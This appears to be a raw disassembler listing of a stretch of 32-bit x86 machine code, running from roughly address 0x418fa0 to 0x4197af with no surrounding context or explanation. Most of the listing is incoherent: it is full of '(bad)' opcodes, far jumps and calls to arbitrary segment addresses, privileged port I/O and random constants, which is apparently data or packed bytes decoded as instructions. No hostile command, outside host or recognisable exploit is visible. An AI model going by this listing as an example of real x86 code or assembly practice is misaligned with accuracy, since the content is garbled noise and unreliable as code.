  418fa0:	fild   DWORD PTR [ebp+0x57bbce5f]
  418fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fa7:	enter  0x40e0,0x61
  418fab:	fucomp st(7)
  418fad:	call   0xb277a4d6
  418fb2:	pop    edi
  418fb3:	jecxz  0x41902a
  418fb5:	in     eax,dx
  418fb6:	addr16 dec esi
  418fb8:	push   es
  418fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fba:	repz xchg esi,eax
  418fbc:	pop    edi
  418fbd:	daa    
  418fbe:	or     al,0x95
  418fc0:	or     bl,BYTE PTR [ebp+edx*8+0x4d74a767]
  418fc7:	shl    DWORD PTR [edx-0x7],0xa3
  418fcb:	cmp    cl,BYTE PTR [edi-0x78]
  418fce:	jmp    0x4188:0x7d87a61d
  418fd5:	aam    0x69
  418fd7:	call   0x74fa5efa
  418fdc:	ret    
  418fdd:	in     al,0x4c
  418fdf:	stos   BYTE PTR es:[edi],al
  418fe0:	daa    
  418fe1:	jnp    0x418fea
  418fe3:	inc    ebp
  418fe4:	inc    eax
  418fe5:	push   edx
  418fe6:	pop    ebx
  418fe7:	adc    DWORD PTR [eax+0x77],edi
  418fea:	adc    ebp,DWORD PTR [esi+0x4d]
  418fed:	jl     0x418fdf
  418fef:	das    
  418ff0:	test   al,0x6e
  418ff2:	mov    ebp,0xfaeb0ce3
  418ff7:	dec    ecx
  418ff8:	jae    0x41904f
  418ffa:	ret    
  418ffb:	outs   dx,BYTE PTR ds:[esi]
  418ffc:	mov    ?,WORD PTR [esp+0x64]
  419000:	mov    esp,0xa2ea88ef
  419005:	outs   dx,DWORD PTR ds:[esi]
  419006:	add    BYTE PTR [edx],bl
  419008:	mov    ah,0x6f
  41900a:	mov    ch,0x36
  41900c:	xor    al,0x96
  41900e:	ret    0xb30
  419011:	or     cl,BYTE PTR [ecx+0x34]
  419014:	and    cl,cl
  419016:	mov    eax,0xe2578803
  41901b:	fstp   TBYTE PTR [ebx]
  41901d:	cs aad 0x67
  419020:	adc    DWORD PTR [esi-0x2b],esp
  419023:	jecxz  0x418fe8
  419025:	(bad)  
  419026:	jmp    0x43c6:0x49a0c898
  41902d:	add    cl,BYTE PTR [esi-0x69bcadc2]
  419033:	add    eax,DWORD PTR [ebx-0x5d958a0a]
  419039:	ins    DWORD PTR es:[edi],dx
  41903a:	hlt    
  41903b:	dec    ecx
  41903c:	add    eax,0xf8bd2cc1
  419041:	jecxz  0x41908b
  419043:	into   
  419044:	and    DWORD PTR [esi+ebp*8+0x7f],ebp
  419048:	sti    
  419049:	adc    DWORD PTR [ebp+0x60],0xb2d30e38
  419050:	bound  ebp,QWORD PTR [ecx+0x7e]
  419053:	not    DWORD PTR [eax+0x12dff859]
  419059:	in     al,dx
  41905a:	mov    al,ds:0x94ae9922
  41905f:	xor    al,0xd1
  419061:	repnz adc BYTE PTR [esi-0xc],ah
  419065:	mov    al,0xd
  419067:	das    
  419068:	xchg   ebp,eax
  419069:	sub    ebp,DWORD PTR [bp+si+0x70f1]
  41906e:	xor    ch,bl
  419070:	inc    edi
  419071:	lds    edi,FWORD PTR [edi-0x64]
  419074:	repz mov ds:0x4d310b53,al
  41907a:	cmp    al,0x37
  41907c:	mov    eax,ds:0x962401cd
  419081:	(bad)  
  419082:	call   0x4142:0xa2f36b93
  419089:	mov    cl,0xde
  41908b:	(bad)  
  41908c:	call   0x1487bc8e
  419091:	fsub   QWORD PTR [ecx+0x8]
  419094:	gs loopne 0x419099
  419097:	mov    ah,0x26
  419099:	xchg   ebx,eax
  41909a:	cli    
  41909b:	ins    DWORD PTR es:[edi],dx
  41909c:	imul   ebx,edx,0xffffff8e
  41909f:	(bad)  
  4190a0:	stos   DWORD PTR es:[edi],eax
  4190a1:	xor    DWORD PTR [esi-0x2df754a4],edi
  4190a7:	lds    esp,FWORD PTR [ebp+0x73]
  4190aa:	or     dl,BYTE PTR [ebx-0x8635964]
  4190b0:	cmp    BYTE PTR [ebx-0x57825f08],ch
  4190b6:	pop    edi
  4190b7:	xchg   ecx,ebx
  4190b9:	xor    al,0xb8
  4190bb:	sub    BYTE PTR ds:0x7e6500a3,bl
  4190c1:	push   ss
  4190c2:	std    
  4190c3:	inc    edi
  4190c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190c5:	inc    ebx
  4190c6:	sub    cl,al
  4190c8:	jae    0x419077
  4190ca:	out    0x57,al
  4190cc:	push   0x7c7af7de
  4190d1:	repnz out dx,al
  4190d3:	(bad)  
  4190d4:	leave  
  4190d5:	dec    edx
  4190d6:	jge    0x419135
  4190d8:	or     eax,0xce270929
  4190dd:	shr    DWORD PTR [eax+0x7fcd8069],cl
  4190e3:	dec    esp
  4190e4:	mov    bl,0x1e
  4190e6:	ds jae 0x419150
  4190e9:	sub    eax,0xbe2df1e8
  4190ee:	cmp    eax,0xe6a6b812
  4190f3:	imul   ebx,DWORD PTR [eax+0x62],0x2a7c3c6
  4190fa:	push   0xffffff9c
  4190fc:	xor    edi,0xb215f2fa
  419102:	inc    ebp
  419103:	inc    edi
  419104:	and    edx,DWORD PTR es:[ecx+ebp*2+0x69]
  419109:	inc    ebx
  41910a:	aad    0xc0
  41910c:	pop    esi
  41910d:	sub    esi,ebp
  41910f:	and    BYTE PTR [esi-0x49],ah
  419112:	push   ebx
  419113:	or     al,BYTE PTR [edx+0x10]
  419116:	ret    
  419117:	fwait
  419118:	nop
  419119:	pop    edi
  41911a:	dec    esp
  41911b:	dec    esi
  41911c:	icebp  
  41911d:	adc    ebx,0x25
  419120:	retf   0x4da5
  419123:	rcl    BYTE PTR [ecx+0x7ec30dc9],0x3a
  41912a:	shl    DWORD PTR [edi-0x4bafa350],0x45
  419131:	data16 aam 0x70
  419134:	add    DWORD PTR [esi-0x30],0x22
  419138:	dec    ecx
  419139:	inc    edi
  41913a:	enter  0x1ed1,0xbe
  41913e:	add    al,0x35
  419140:	in     al,dx
  419141:	and    eax,0x4ff9f2d9
  419146:	(bad)  
  419148:	sbb    cl,BYTE PTR [ebx+0x5b]
  41914b:	pop    esp
  41914c:	xor    ebp,DWORD PTR [edi]
  41914e:	mov    esi,0x93f546d6
  419153:	mov    ds:0x2553c60c,al
  419158:	out    dx,eax
  419159:	adc    al,0xbe
  41915b:	jecxz  0x41912f
  41915d:	mov    ebx,0x4a0159ed
  419162:	dec    esp
  419163:	mov    esi,0xa3a2b87a
  419168:	ja     0x4191de
  41916a:	ss jno 0x419131
  41916d:	mov    ebx,0x3f5f286c
  419172:	iret   
  419173:	shr    bl,1
  419175:	fisubr DWORD PTR [ecx]
  419177:	(bad)  
  419178:	jmp    0xa4f1eb5b
  41917d:	mov    ds:0xa38d766a,al
  419182:	pop    ebp
  419183:	push   ecx
  419184:	jle    0x419172
  419186:	lahf   
  419187:	or     edi,DWORD PTR [esi+0x1b]
  41918a:	sub    al,0xb1
  41918c:	mov    eax,0xb794920
  419191:	jp     0x41915e
  419193:	jo     0x4191a2
  419195:	lahf   
  419196:	mov    al,0x7b
  419198:	clc    
  419199:	out    0x83,eax
  41919b:	lock inc DWORD PTR [esi]
  41919e:	pop    es
  41919f:	mov    ds:0xc7132c20,al
  4191a4:	jns    0x4191f7
  4191a6:	outs   dx,DWORD PTR ds:[esi]
  4191a7:	movzx  esi,di
  4191aa:	mov    al,0x94
  4191ac:	add    ah,0x81
  4191af:	rcl    DWORD PTR [edx+ebx*2-0x47caed7d],1
  4191b6:	inc    esp
  4191b7:	mov    edi,0x9c8d91da
  4191bc:	sbb    al,0x24
  4191be:	(bad)  
  4191bf:	inc    eax
  4191c0:	aaa    
  4191c1:	imul   edi,ebx,0x8fa5b1c6
  4191c7:	mov    dl,ch
  4191c9:	jo     0x4191b1
  4191cb:	fld    DWORD PTR [esi]
  4191cd:	dec    esp
  4191ce:	xor    cl,BYTE PTR [ecx+0x2502954a]
  4191d4:	(bad)  
  4191d5:	and    ah,dl
  4191d7:	cwde   
  4191d8:	inc    edx
  4191d9:	jl     0x419220
  4191db:	(bad)  
  4191dd:	shl    DWORD PTR [esi+esi*4-0x5e],1
  4191e1:	imul   edi,DWORD PTR ds:0x79112338,0x5d28c9d3
  4191eb:	fdiv   st,st(6)
  4191ed:	sbb    dh,BYTE PTR [esi+0x59a38fe9]
  4191f3:	scas   al,BYTE PTR es:[edi]
  4191f4:	inc    esi
  4191f5:	add    esp,DWORD PTR [esi-0x780f09de]
  4191fb:	stos   DWORD PTR es:[edi],eax
  4191fc:	ja     0x4191e0
  4191fe:	mov    cl,0xad
  419200:	(bad)  
  419201:	rcr    DWORD PTR [edi],cl
  419203:	fstp   TBYTE PTR [esi+0x18349cec]
  419209:	push   esp
  41920a:	xchg   ebp,eax
  41920b:	imul   esp,DWORD PTR [edi+0x297a0224],0xffffffb4
  419212:	ja     0x4191c5
  419214:	repnz cmc 
  419216:	or     al,0xb0
  419218:	mov    ds:0x7b6195b9,eax
  41921d:	mov    ebx,0x8987861b
  419222:	int3   
  419223:	unpcklps xmm0,XMMWORD PTR [eax-0x52]
  419227:	xor    al,0x3e
  419229:	in     al,dx
  41922a:	sub    dh,0x6f
  41922d:	inc    esp
  41922e:	adc    DWORD PTR [edi],0x40
  419231:	pop    ss
  419232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419233:	push   ss
  419234:	push   0x42
  419236:	(bad)  
  419238:	in     al,dx
  419239:	or     eax,0xb5ba8d67
  41923e:	xor    ebp,ebx
  419240:	ret    
  419241:	mov    ah,0xb0
  419243:	sbb    ch,BYTE PTR [ebx+ebp*2+0x5198226a]
  41924a:	mov    bl,0xf2
  41924c:	sub    eax,0xe889507b
  419251:	sub    al,0xce
  419253:	dec    esi
  419254:	adc    eax,0x5fe72ad9
  419259:	jle    0x41921e
  41925b:	cdq    
  41925c:	data16 ja 0x41926a
  41925f:	repz addr16 cli 
  419262:	mov    ds:0xc752dae5,eax
  419267:	jno    0x419294
  419269:	popf   
  41926a:	mov    bh,0x90
  41926c:	clc    
  41926d:	xchg   edi,eax
  41926e:	mov    al,ds:0x3f9c11a6
  419273:	sbb    eax,0x8f261c5d
  419278:	retf   
  419279:	sahf   
  41927a:	xchg   esp,eax
  41927b:	jo     0x41922f
  41927d:	pushf  
  41927e:	ins    BYTE PTR es:[edi],dx
  41927f:	dec    edi
  419280:	push   edx
  419281:	sub    BYTE PTR [esi+ecx*8+0x4a],ch
  419285:	es dec ebp
  419287:	cmp    esp,ebp
  419289:	in     eax,0xbe
  41928b:	aas    
  41928c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41928d:	leave  
  41928e:	imul   esp,DWORD PTR ds:[esi-0x4e2c6454],0x49aab18
  419299:	jmp    0x4192e6
  41929b:	call   0x3400:0x1aa104e8
  4192a2:	inc    edx
  4192a3:	jne    0x419287
  4192a5:	mov    bl,0xa9
  4192a7:	xlat   BYTE PTR ds:[ebx]
  4192a8:	jb     0x41931b
  4192aa:	dec    esp
  4192ab:	push   ss
  4192ac:	movups XMMWORD PTR [ebx-0x2e],xmm4
  4192b0:	pop    ebx
  4192b1:	or     DWORD PTR [esp+eiz*8+0xd],esp
  4192b5:	cmp    eax,0x9d951b8
  4192ba:	add    al,BYTE PTR [ecx]
  4192bc:	ins    DWORD PTR es:[edi],dx
  4192bd:	mov    edi,0xf8305808
  4192c2:	sbb    esi,DWORD PTR [edi]
  4192c4:	shr    edx,1
  4192c6:	sahf   
  4192c7:	xchg   edx,eax
  4192c8:	jae    0x4192f5
  4192ca:	std    
  4192cb:	or     esp,DWORD PTR [ecx+0x71]
  4192ce:	xchg   esi,eax
  4192cf:	mov    ebp,0xfd7046c1
  4192d4:	push   eax
  4192d5:	icebp  
  4192d6:	mov    edi,0x372da3d7
  4192db:	out    dx,al
  4192dc:	mov    edx,0x1eee8c3a
  4192e1:	add    eax,0xd5e48997
  4192e6:	inc    edi
  4192e7:	ror    BYTE PTR [edx+0x75],cl
  4192ea:	scas   al,BYTE PTR es:[edi]
  4192eb:	push   0x19aee03f
  4192f0:	ficomp DWORD PTR [edx+0x22df746b]
  4192f6:	or     BYTE PTR [esi-0x5cdd7d6],0xcc
  4192fd:	nop
  4192fe:	or     DWORD PTR [esi+esi*2-0x6b5d717e],0xffffff9c
  419306:	out    0x6b,eax
  419308:	sar    BYTE PTR [ecx],cl
  41930a:	jae    0x419338
  41930c:	sbb    eax,0x36d90944
  419311:	mov    dl,0x9a
  419313:	pop    ss
  419314:	mov    esi,0x232c9fbb
  419319:	lods   al,BYTE PTR ds:[esi]
  41931a:	add    DWORD PTR [edx],ebp
  41931c:	fs scas eax,DWORD PTR es:[edi]
  41931e:	ins    BYTE PTR es:[edi],dx
  41931f:	xor    dl,ah
  419321:	inc    ecx
  419322:	pop    ebp
  419323:	mov    eax,0xefcd6fae
  419328:	sbb    ah,dl
  41932a:	mov    edi,DWORD PTR [ebx]
  41932c:	pusha  
  41932d:	sar    DWORD PTR [edi-0x38],1
  419330:	mov    ebx,0xdd3e71e0
  419335:	fst    QWORD PTR [ebx]
  419337:	pushf  
  419338:	stc    
  419339:	(bad)  
  41933a:	pop    edx
  41933b:	in     al,0x9c
  41933d:	ins    DWORD PTR es:[edi],dx
  41933e:	cwde   
  41933f:	loope  0x4192f7
  419341:	jmp    0x419362
  419343:	mul    DWORD PTR [ebx+0x661b9aaf]
  419349:	mov    esi,0x8e2b9119
  41934e:	mov    eax,0x897c2710
  419353:	mov    eax,ds:0x23795a86
  419358:	push   ds
  419359:	mov    ecx,0xf3f2a99d
  41935e:	pop    esp
  41935f:	xlat   BYTE PTR ds:[ebx]
  419360:	mov    ch,0x7e
  419362:	aas    
  419363:	inc    DWORD PTR ds:0x65c0cd9b
  419369:	push   ecx
  41936a:	mov    al,ds:0x8301b076
  41936f:	call   0x95ae:0x3a56773a
  419376:	and    dl,BYTE PTR [edx]
  419378:	ss push esp
  41937a:	bound  ebx,QWORD PTR [edi+0x3f]
  41937d:	pop    ebp
  41937e:	sahf   
  41937f:	xor    al,0xf0
  419381:	pop    ebp
  419382:	push   cs
  419383:	shl    WORD PTR [edi+0x38e7b16d],0x32
  41938b:	not    DWORD PTR [eax-0x7baee7f0]
  419391:	and    eax,0xda821991
  419396:	imul   DWORD PTR [esi+eax*4-0x4d]
  41939a:	fistp  QWORD PTR [ebx+0xcb3da93]
  4193a0:	xchg   BYTE PTR [esi],al
  4193a2:	mov    ch,0xf6
  4193a4:	cmp    al,0x32
  4193a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193a7:	or     esi,DWORD PTR ds:0xbeafd68
  4193ad:	test   BYTE PTR [ecx],ah
  4193af:	cmp    DWORD PTR [eax-0x4041f3b0],edi
  4193b5:	mov    DWORD PTR cs:[ecx],esp
  4193b8:	movd   esi,mm5
  4193bb:	inc    edi
  4193bc:	lahf   
  4193bd:	sbb    DWORD PTR [ecx+0x553f5d2d],ebx
  4193c3:	add    ecx,DWORD PTR [ebp+0x48]
  4193c6:	jecxz  0x419443
  4193c8:	ficom  WORD PTR [esi-0x2168247d]
  4193ce:	dec    ebp
  4193cf:	fsubr  QWORD PTR [eax-0xe]
  4193d2:	jge    0x4193fe
  4193d4:	jecxz  0x419362
  4193d6:	push   ebx
  4193d7:	push   edi
  4193d8:	cmp    eax,0xb879dab5
  4193dd:	(bad)  
  4193df:	sbb    ax,0x59c6
  4193e3:	jecxz  0x419375
  4193e5:	dec    DWORD PTR [ecx-0x37]
  4193e8:	and    esi,esp
  4193ea:	dec    esi
  4193eb:	push   edx
  4193ec:	or     DWORD PTR [eax+0x7d665bcc],esi
  4193f2:	(bad)  
  4193f3:	in     eax,0x1c
  4193f5:	jae    0x419394
  4193f7:	das    
  4193f8:	jle    0x4193b3
  4193fa:	jecxz  0x419395
  4193fc:	mov    eax,ds:0xd2b4c7da
  419401:	adc    BYTE PTR [ecx+ecx*1],al
  419404:	test   eax,0x28b61456
  419409:	dec    esp
  41940a:	dec    ecx
  41940b:	fsincos 
  41940d:	mov    al,bl
  41940f:	or     esi,DWORD PTR [ebx+0x3942222e]
  419415:	jl     0x419400
  419417:	mov    ah,0x16
  419419:	loop   0x419443
  41941b:	test   DWORD PTR [ebp-0x75f0313b],0x6de44b43
  419425:	xchg   ebp,eax
  419426:	bound  ebp,QWORD PTR ds:0x2afd24e1
  41942c:	xchg   edx,eax
  41942d:	dec    eax
  41942e:	into   
  41942f:	dec    ebx
  419430:	scas   eax,DWORD PTR es:[edi]
  419431:	ja     0x4193c6
  419433:	mov    bl,0x32
  419435:	test   eax,0xa87d0fd3
  41943a:	fstp   TBYTE PTR [esi-0x80]
  41943d:	jo     0x41945c
  41943f:	cmp    eax,ebx
  419441:	jne    0x419493
  419443:	scas   al,BYTE PTR es:[edi]
  419444:	pop    esp
  419445:	mov    WORD PTR [edx-0x3a286ad7],gs
  41944b:	fisub  WORD PTR [eax-0x21580106]
  419451:	fcom   DWORD PTR [ebp+0x4]
  419454:	and    edx,DWORD PTR [edx]
  419456:	outs   dx,BYTE PTR ds:[esi]
  419457:	pusha  
  419458:	enter  0x5a37,0x15
  41945c:	jo     0x4194ce
  41945e:	retf   
  41945f:	sub    esp,ecx
  419461:	imul   esp,DWORD PTR [edx],0xcea03d4a
  419467:	inc    eax
  419468:	inc    ebx
  419469:	sbb    BYTE PTR [esi-0x34],ah
  41946c:	sti    
  41946d:	xor    ebx,DWORD PTR [ecx+0x7f]
  419470:	pop    esp
  419471:	faddp  st(1),st
  419473:	ins    DWORD PTR es:[edi],dx
  419474:	and    BYTE PTR [esi+ecx*1-0x37],0xb9
  419479:	repnz mul bh
  41947c:	ds xor al,0x50
  41947f:	js     0x4194fe
  419481:	sbb    al,0x18
  419483:	(bad)
  419486:	dec    ebp
  419487:	inc    edx
  419488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419489:	or     DWORD PTR [esi+edx*2],0x3d
  41948d:	mov    bh,0x1
  41948f:	jae    0x419456
  419491:	adc    eax,DWORD PTR [ecx+0xb19391d]
  419497:	mov    al,ds:0x79b30bfc
  41949c:	adc    edx,DWORD PTR [esp+edi*1-0x44]
  4194a0:	stos   DWORD PTR es:[edi],eax
  4194a1:	inc    esi
  4194a2:	cmp    DWORD PTR [eax],ecx
  4194a4:	xchg   edi,eax
  4194a5:	xor    DWORD PTR [esi],eax
  4194a7:	jge    0x419516
  4194a9:	gs push edx
  4194ab:	dec    ecx
  4194ac:	pop    es
  4194ad:	dec    ecx
  4194ae:	xor    dl,ch
  4194b0:	lods   al,BYTE PTR ds:[esi]
  4194b1:	sub    eax,0xf219998b
  4194b6:	jmp    0xadd8:0xa188b2b5
  4194bd:	outs   dx,BYTE PTR ds:[esi]
  4194be:	mov    cl,0x93
  4194c0:	sub    BYTE PTR [eax+esi*8+0x3c],ch
  4194c4:	scas   al,BYTE PTR es:[edi]
  4194c5:	or     esi,DWORD PTR [ecx]
  4194c7:	mov    ebp,0x900c0972
  4194cc:	xor    al,0x49
  4194ce:	jp     0x4194ce
  4194d0:	pop    ecx
  4194d1:	mov    bl,0x72
  4194d3:	xchg   DWORD PTR [esi+0x79],eax
  4194d6:	pusha  
  4194d7:	mov    al,ds:0xa1641b0d
  4194dc:	inc    eax
  4194dd:	daa    
  4194de:	clc    
  4194df:	outs   dx,BYTE PTR ds:[esi]
  4194e0:	cmp    bh,BYTE PTR [ecx]
  4194e2:	call   0xc18b:0x7d6da61e
  4194e9:	dec    ecx
  4194ea:	repnz cmp al,0xf1
  4194ed:	cmp    bh,BYTE PTR [ebp-0xa]
  4194f0:	xchg   ebx,eax
  4194f1:	stc    
  4194f2:	fxtract 
  4194f4:	mov    ebx,ebx
  4194f6:	push   esp
  4194f7:	(bad)  
  4194f8:	dec    ecx
  4194f9:	clc    
  4194fa:	cmc    
  4194fb:	jp     0x419486
  4194fd:	xchg   edx,eax
  4194fe:	or     eax,DWORD PTR [edi-0x5f25e999]
  419504:	pop    ebx
  419505:	add    ecx,eax
  419507:	js     0x4194dc
  419509:	daa    
  41950a:	mov    edx,0x9a678cf7
  41950f:	xchg   ebx,eax
  419510:	test   eax,0xe126532
  419515:	adc    eax,0xdce25dca
  41951a:	mov    bh,0x29
  41951c:	ds push 0x1b3c63eb
  419522:	fs inc ecx
  419524:	dec    ebp
  419525:	aam    0xb5
  419527:	dec    ebx
  419528:	dec    ebx
  419529:	sbb    ch,ch
  41952b:	or     dl,dl
  41952d:	cwde   
  41952e:	mov    dh,0x7f
  419530:	into   
  419531:	retf   0x442d
  419534:	jo     0x4195ae
  419536:	push   edi
  419537:	cmp    bl,BYTE PTR [ebx-0x57e07150]
  41953d:	jle    0x41956a
  41953f:	in     al,0xbb
  419541:	je     0x419596
  419543:	jo     0x419577
  419545:	stos   BYTE PTR es:[edi],al
  419546:	mov    bl,0x82
  419548:	adc    BYTE PTR [esi-0x38e2fffc],al
  41954e:	iret   
  41954f:	mov    al,0xb2
  419551:	mov    cl,0x29
  419553:	aad    0x13
  419555:	jmp    0x44ec:0xe34a0e09
  41955c:	dec    ebp
  41955d:	push   esi
  41955e:	daa    
  41955f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419560:	mov    bh,0x3b
  419562:	pop    edx
  419563:	xchg   edi,eax
  419564:	int    0x76
  419566:	jp     0x419532
  419568:	jg     0x4195df
  41956a:	shr    DWORD PTR [ebp-0x17c35063],0x30
  419571:	jno    0x4195ac
  419573:	adc    eax,0x70fd872f
  419578:	test   al,0xe6
  41957a:	xchg   ebx,eax
  41957b:	pop    esp
  41957c:	sub    esi,ebp
  41957e:	cmp    eax,0x95dc2a01
  419583:	pusha  
  419584:	push   0x87b8d0ec
  419589:	arpl   WORD PTR [edi+0x5],si
  41958c:	cmp    DWORD PTR ds:0xcbc5f8b0,eax
  419592:	sub    ebp,DWORD PTR [ebx-0x5a]
  419595:	ins    BYTE PTR es:[edi],dx
  419596:	(bad)  
  419597:	aas    
  419598:	dec    ecx
  419599:	into   
  41959a:	stos   BYTE PTR es:[edi],al
  41959b:	(bad)  
  41959c:	push   esi
  41959d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41959e:	sti    
  41959f:	jmp    0x419605
  4195a1:	sahf   
  4195a2:	push   eax
  4195a3:	jmp    0x41952c
  4195a5:	repnz mov ds:0x6576bbab,al
  4195ab:	les    ebp,FWORD PTR [edi-0x3a1afaf1]
  4195b1:	xor    eax,0x3624ed4c
  4195b6:	jg     0x419554
  4195b8:	jg     0x41954a
  4195ba:	dec    esp
  4195bb:	and    BYTE PTR [esi-0x75],ah
  4195be:	das    
  4195bf:	out    0xe7,al
  4195c1:	add    esp,DWORD PTR [ecx+eiz*1+0x3f]
  4195c5:	aaa    
  4195c6:	xchg   ebp,eax
  4195c7:	add    DWORD PTR [edx+ebx*8+0x76eace46],0x42ddbef4
  4195d2:	call   0x1bac782
  4195d7:	test   eax,0xe4819d7a
  4195dc:	xchg   edx,eax
  4195dd:	out    0x10,al
  4195df:	and    cl,ch
  4195e1:	mov    bl,0x66
  4195e3:	addr16 jns 0x41956a
  4195e6:	pop    ecx
  4195e7:	sar    ch,1
  4195e9:	xchg   edx,eax
  4195ea:	enter  0x4f2,0xf2
  4195ee:	es pop esp
  4195f0:	popf   
  4195f1:	sbb    DWORD PTR [esi],ecx
  4195f3:	loop   0x4195b5
  4195f5:	ret    
  4195f6:	mov    BYTE PTR [edx+0x3],bh
  4195f9:	add    ecx,edx
  4195fb:	or     ah,BYTE PTR [eax+edi*1+0x58]
  4195ff:	ins    DWORD PTR es:[edi],dx
  419600:	pop    ds
  419601:	pop    DWORD PTR [edx-0x63]
  419604:	jae    0x419679
  419606:	xor    eax,DWORD PTR [edx-0x44c13655]
  41960c:	and    eax,DWORD PTR [eax+0x4aee9d9]
  419612:	dec    esp
  419613:	xrstor [eax]
  419616:	lods   al,BYTE PTR ds:[esi]
  419617:	pusha  
  419618:	lahf   
  419619:	mov    BYTE PTR [ecx+esi*8],dl
  41961c:	neg    DWORD PTR [edi]
  41961e:	add    DWORD PTR [edi],edi
  419620:	inc    eax
  419621:	sbb    eax,0x2dd3e8a2
  419626:	push   edi
  419627:	jno    0x41961c
  419629:	add    BYTE PTR [ecx-0x5138d201],0xf7
  419630:	clc    
  419631:	fucomi st,st(0)
  419633:	shr    ecx,cl
  419635:	xor    edx,DWORD PTR [eax+0x61]
  419638:	ret    
  419639:	sbb    esp,DWORD PTR [esi+0x5d]
  41963c:	int    0xaa
  41963e:	popa   
  41963f:	shr    BYTE PTR [ebp-0x5539f9],0xde
  419646:	mov    ch,0x67
  419648:	jg     0x4195ca
  41964a:	and    ch,BYTE PTR [ebp-0x3676117f]
  419650:	in     eax,dx
  419651:	shr    BYTE PTR [eax+0x29e5461d],cl
  419657:	pop    esp
  419658:	xor    BYTE PTR [ebx+0x2940a6af],bl
  41965e:	neg    DWORD PTR [ecx+ebp*4]
  419661:	mov    eax,0x4778125b
  419666:	shl    DWORD PTR [edi],cl
  419668:	frstor [ecx+edi*2+0x38]
  41966c:	fsub   QWORD PTR ds:0x708628a3
  419672:	test   eax,0xe94f4f6f
  419677:	fnstcw WORD PTR ds:0x2f6e6c72
  41967d:	shl    BYTE PTR [eax-0x19],1
  419680:	push   edi
  419681:	fldcw  WORD PTR cs:[edi+0xb]
  419685:	mov    al,0x60
  419687:	jbe    0x419619
  419689:	inc    esi
  41968a:	retf   
  41968b:	fcmovnbe st,st(0)
  41968d:	xchg   ecx,eax
  41968e:	cmovle esi,ebx
  419691:	retf   
  419692:	mov    eax,0x79e8b13a
  419697:	adc    eax,0xa54e9080
  41969c:	cmp    eax,0xc8c3e355
  4196a1:	ret    0xf998
  4196a4:	jmp    0x46d46156
  4196a9:	addr16 std 
  4196ab:	or     al,0x1
  4196ad:	jno    0x4196ce
  4196af:	ja     0x419678
  4196b1:	sbb    DWORD PTR [ebp+0x29],ecx
  4196b4:	sub    al,0x81
  4196b6:	mov    esi,0xe0351b7b
  4196bb:	mov    al,0x4f
  4196bd:	fdivrp st(6),st
  4196bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196c0:	jmp    0x4196ec
  4196c2:	shr    DWORD PTR fs:[esi],1
  4196c5:	push   ds
  4196c6:	mov    al,bh
  4196c8:	sbb    al,bh
  4196ca:	(bad)  
  4196cb:	imul   edi,DWORD PTR [edx+0x45],0x663fa63b
  4196d2:	stos   BYTE PTR es:[edi],al
  4196d3:	mov    bh,0x1d
  4196d5:	shl    DWORD PTR ds:0xdbebe01c,cl
  4196db:	cmp    al,BYTE PTR [edi-0x2b]
  4196de:	out    dx,al
  4196df:	fmulp  st(6),st
  4196e1:	mov    bh,0x38
  4196e3:	add    eax,0x8a39f70e
  4196e8:	(bad)  
  4196e9:	push   edi
  4196ea:	jns    0x41973f
  4196ec:	mov    edx,0xa54c782c
  4196f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196f2:	rcr    BYTE PTR [eax+0x65100802],1
  4196f8:	push   ds
  4196f9:	pxor   mm1,QWORD PTR [esi]
  4196fc:	inc    ebx
  4196fd:	cmp    edx,DWORD PTR [eax+edi*8-0x34]
  419701:	call   0x812f:0x7d755e81
  419708:	cld    
  419709:	pusha  
  41970a:	mov    edi,0x4806ec9b
  41970f:	sub    al,0x6b
  419711:	popf   
  419712:	es (bad) 
  419714:	and    ah,BYTE PTR [edi+ebp*1]
  419717:	inc    edi
  419718:	push   ebp
  419719:	ins    DWORD PTR es:[edi],dx
  41971a:	pop    edx
  41971b:	outs   dx,BYTE PTR ds:[esi]
  41971c:	cs mov ch,0x18
  41971f:	(bad)  
  419720:	dec    ecx
  419721:	les    esi,FWORD PTR [ecx+0xdc691ae]
  419727:	popa   
  419728:	push   ds
  419729:	cmp    BYTE PTR [ebx],bl
  41972b:	nop
  41972c:	sub    ch,BYTE PTR [ebx-0x63]
  41972f:	test   al,0x78
  419731:	xchg   DWORD PTR cs:[ebx-0x693ff4a4],edx
  419738:	pop    ebp
  419739:	ins    BYTE PTR es:[edi],dx
  41973a:	jg     0x41972e
  41973c:	mov    edx,0x5c9d6519
  419742:	test   ebp,0xa689baeb
  419748:	and    BYTE PTR [ebp+0x788a1b4],ch
  41974e:	pusha  
  41974f:	popa   
  419750:	jb     0x4196ed
  419752:	dec    edx
  419753:	lahf   
  419754:	hlt    
  419755:	aad    0xd0
  419757:	adc    eax,ecx
  419759:	fisttp DWORD PTR [ebp-0x29df8a88]
  41975f:	mov    al,ds:0x714740f4
  419764:	push   eax
  419765:	dec    edi
  419766:	pop    ebp
  419767:	lea    esp,[ebx+0x72]
  41976a:	xor    DWORD PTR [esp+edi*1-0x292a2e5c],esp
  419771:	aad    0x7a
  419773:	inc    ecx
  419774:	fs aaa 
  419776:	pop    eax
  419777:	or     eax,0xbb15168c
  41977c:	pop    ecx
  41977d:	pop    edx
  41977e:	dec    ecx
  41977f:	sbb    DWORD PTR [eax-0x5a],ebp
  419782:	mov    al,al
  419784:	shl    DWORD PTR ds:0x1de2ea59,1
  41978a:	push   edx
  41978b:	xchg   ecx,eax
  41978c:	pop    ds
  41978d:	sbb    edi,DWORD PTR fs:0x6a493bb5
  419794:	lods   al,BYTE PTR ds:[esi]
  419795:	cmp    DWORD PTR [esi+0x47],eax
  419798:	(bad)  
  419799:	stos   DWORD PTR es:[edi],eax
  41979a:	jne    0x419753
  41979c:	xor    BYTE PTR [ebp-0x70bf7e71],dh
  4197a2:	test   DWORD PTR [eax],edi
  4197a4:	fdivr  DWORD PTR [esi+edi*2-0x3f17e8e5]
  4197ab:	dec    esp
  4197ac:	jno    0x41973d
  4197ae:	dec    ebp
  4197af:	(bad)  
